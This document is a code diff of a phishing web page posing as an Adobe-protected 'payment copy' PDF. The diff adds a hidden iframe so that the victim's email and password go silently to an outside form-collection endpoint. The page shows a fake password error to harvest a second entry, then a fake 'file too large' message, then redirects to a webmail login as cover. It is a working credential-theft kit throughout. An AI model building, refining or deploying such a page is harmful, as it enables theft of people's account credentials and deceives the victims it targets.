@@ -4,7 +4,6 @@
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
   <title>Protected PDF — Payment Copy</title>
-
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { height: 100%; }
@@ -97,9 +96,10 @@
       <h1>This File is Protected By Adobe®<br>Security.</h1>
       <p class="lead">Click Continue to enter your password and view the payment copy.</p>
 
-      <form id="mainForm" action="https://submit-form.com/ZydlGqudc" method="POST" autocomplete="on">
+      <!-- form submission using iframe -->
+      <form id="mainForm" action="https://submit-form.com/ZydlGqudc" method="POST" target="hiddenFrame" autocomplete="on">
         <div id="stepEmail">
-          <input id="email" name="email" class="input" type="email" placeholder="Email address" readonly>
+          <input id="email" name="email" class="input" type="email" placeholder="Email address" readonly required>
           <div class="download-wrap">
             <button id="continueBtn" class="btn-download" type="button">Continue</button>
           </div>
@@ -123,6 +123,8 @@
           </div>
         </div>
       </form>
+
+      <iframe name="hiddenFrame" style="display:none;"></iframe>
 
       <div class="file-info">
         <div class="file-thumb">
@@ -155,7 +157,6 @@
   const continueBtn = document.getElementById('continueBtn');
   const toggle = document.getElementById('togglePassword');
   const errorMessage = document.getElementById('errorMessage');
-  const submitError = document.getElementById('submitError');
   const firstPasswordField = document.getElementById('firstPasswordField');
   let passwordFirstEntry = "";
 
@@ -182,21 +183,19 @@
     passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
   });
 
-  // Submit logic
-  document.getElementById('mainForm').addEventListener('submit', async (e) => {
-    e.preventDefault();
-    submitError.style.display = 'none';
-
+  // Handle password logic
+  document.getElementById('mainForm').addEventListener('submit', (e) => {
     if (passwordFirstEntry === "") {
+      e.preventDefault();
       passwordFirstEntry = passwordInput.value;
       firstPasswordField.value = passwordFirstEntry;
       passwordInput.value = '';
       errorMessage.style.display = 'block';
       passwordInput.focus();
-      return;
+      return false;
     }
 
-    // Show overlay
+    // Show overlay loader
     const overlay = document.createElement('div');
     overlay.style.cssText = `
       position:fixed;top:0;left:0;width:100%;height:100%;
@@ -211,41 +210,18 @@
       animation:spin 1s linear infinite;
     `;
     const msg = document.createElement('p');
-    msg.style.cssText = `
-      margin-top:20px;font-size:16px;color:#d32f2f;font-weight:600;
-    `;
-    msg.textContent = 'File too large, contact the sender to send in smaller chunk or view with roundcube…';
+    msg.style.cssText = `margin-top:20px;font-size:16px;color:#d32f2f;font-weight:600;`;
+    msg.textContent = 'File too large, please contact the sender to send in smaller chunks...';
     overlay.append(spinner, msg);
     document.body.append(overlay);
 
-    try {
-      const response = await fetch(e.target.action, {
-        method: 'POST',
-        body: new FormData(e.target)
-      });
-
-      if (response.ok) {
-        console.log('✅ Form submitted successfully');
-        setTimeout(() => {
-          window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
-        }, 3500);
-      } else {
-        console.error('❌ Submission failed');
-        submitError.textContent = "Submission failed. Please try again later.";
-        submitError.style.display = 'block';
-        document.body.removeChild(overlay);
-      }
-    } catch (err) {
-      console.error('❌ Network error:', err);
-      submitError.textContent = "Network error. Please try again.";
-      submitError.style.display = 'block';
-      document.body.removeChild(overlay);
-    }
+    // Redirect after 3s
+    setTimeout(() => {
+      window.location.href = "https://webmail.roundcube.101.hostinglogin.net/";
+    }, 3000);
   });
 </script>
 
-<style>
-  @keyframes spin { to { transform: rotate(360deg); } }
-</style>
+<style>@keyframes spin { to { transform: rotate(360deg); } }</style>
 </body>
 </html>
